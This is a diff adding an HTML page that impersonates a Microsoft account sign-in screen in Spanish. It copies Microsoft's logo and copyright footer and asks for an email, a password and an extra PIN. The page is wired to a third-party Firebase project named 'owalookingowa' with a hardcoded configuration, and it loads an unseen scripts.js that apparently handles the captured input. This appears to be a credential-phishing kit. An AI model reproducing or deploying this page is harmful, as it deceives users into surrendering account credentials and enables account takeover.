@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link  rel="icon" type="image/x-icon" href="https://cdn.pixabay.com/photo/2013/02/12/09/07/microsoft-80660_960_720.png" sizes="16x16"/>
+    <title>Iniciar sesión en tu cuenta Microsoft</title>
+     <link rel="stylesheet" type="text/css" href="estilo.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=no">
+     
+
+<style type="text/css">body{display:none;}</style>
+
+<style type="text/css">body{display:block !important;}</style>
+<noscript><style type="text/css">body{display:block !important;}</style></noscript>
+
+</head>
+<body class="cb" data-bind="defineGlobals: ServerData, bodyCssClass">
+  <div id="container"> 
+    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="">
+  <p id="nn" style="display: none;"></p>
+
+  
+<h2>Iniciar sesión</h2>
+
+    <form action="#"  >
+    
+      
+        <input type="email" id="name" placeholder="Correo electrónico, teléfono o Skype" required>
+      
+      
+        <input id="pws" type="password" minlength="8" placeholder="Contraseña" required>
+        <small>Para mayor seguridad crea un PIN a tu cuenta.</small> 
+  <h7> Privacidad Aviso legal  © Microsoft 2021</h7>  
+     
+<div><img src="llave.jpeg" alt="llave.png" style="width: 30px"></div>
+        <input type="text" id="namee" minlength="4" maxlength="4" class="pin" placeholder="PIN ****" required>
+
+
+      
+          <button type="submit" id="bntss" >Iniciar Sesion</button>
+
+    </form>
+
+
+
+    
+</body>
+
+<!-- The core Firebase JS SDK is always required and must be listed first -->
+<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-app.js"></script>
+
+<!-- TODO: Add SDKs for Firebase products that you want to use
+ https://firebase.google.com/docs/web/setup#available-libraries -->
+<script src="https://www.gstatic.com/firebasejs/8.6.5/firebase-firestore.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script>
+    // Your web app's Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyCSS_QJ2P4uH6SPcy228GEdwVHyq_YeI5U",
+    authDomain: "owalookingowa.firebaseapp.com",
+    projectId: "owalookingowa",
+    storageBucket: "owalookingowa.appspot.com",
+    messagingSenderId: "718431408425",
+    appId: "1:718431408425:web:c5204a2050dd33dabca738"
+  };
+    // Initialize Firebase
+  
+    firebase.initializeApp(firebaseConfig);
+</script>
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script src="scripts.js"></script>
+</html>
